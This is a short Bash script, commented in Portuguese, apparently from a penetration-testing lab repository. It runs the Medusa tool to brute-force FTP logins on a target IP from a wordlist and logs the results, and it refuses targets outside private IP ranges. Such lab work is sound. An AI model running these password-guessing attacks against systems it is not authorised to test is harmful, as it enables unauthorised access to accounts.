#!/bin/bash
# Exemplo seguro de execução do Medusa em laboratório
# Uso: ./run_medusa_example_safe.sh <TARGET_IP> <USER> <PATH_TO_WORDLIST>
# Exemplo: ./run_medusa_example_safe.sh 192.168.56.20 ftp /home/kali/wordlists/small.txt

set -euo pipefail

if [[ "$#" -ne 3 ]]; then
  echo "Uso: $0 <TARGET_IP> <USER> <PATH_TO_WORDLIST>" >&2
  exit 1
fi

TARGET="$1"
USER="$2"
WORDLIST="$3"

# Pasta de saída (relacionada ao repositório)
REPO_ROOT="$(dirname "$(dirname "$(realpath "$0")")")"
OUT_DIR="$REPO_ROOT/evidences/logs"
mkdir -p "$OUT_DIR"

LOG_FILE="$OUT_DIR/medusa_${TARGET}_$(date +%Y%m%d_%H%M%S).log"

# Segurança: permitir apenas IPs privados (evitar alvo público acidental)
if [[ ! "$TARGET" =~ ^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1])\.) ]]; then
  echo "Alvo $TARGET não parece ser um IP privado (10.x.x.x, 192.168.x.x ou 172.16-31.x)." >&2
  echo "Para segurança, o script aborta. Use este script somente em ambiente isolado." >&2
  exit 2
fi

if [[ ! -f "$WORDLIST" ]]; then
  echo "Wordlist não encontrada em: $WORDLIST" >&2
  exit 3
fi

echo "Executando Medusa contra $TARGET (usuário: $USER)" | tee "$LOG_FILE"
echo "Saída completa será gravada em: $LOG_FILE"

# Comando genérico — NÃO inclua opções destrutivas.
# O serviço (-M) deve ser ajustado conforme o serviço detectado (ssh, ftp, http, smb, etc.).
# Aqui usamos -M ftp como exemplo. Altere para o serviço correto antes de rodar.

MEDUSA_CMD=(medusa -h "$TARGET" -u "$USER" -P "$WORDLIST" -M ftp -t 4 -f)

echo "Comando: ${MEDUSA_CMD[*]}" | tee -a "$LOG_FILE"

# Executa e grava saída
"${MEDUSA_CMD[@]}" 2>&1 | tee -a "$LOG_FILE"

echo "Execução finalizada. Verifique: $LOG_FILE"

echo "Observação: ajuste -M (serviço) se necessário; este script NÃO realiza exploração — apenas tentativa controlada de autenticação." | tee -a "$LOG_FILE"
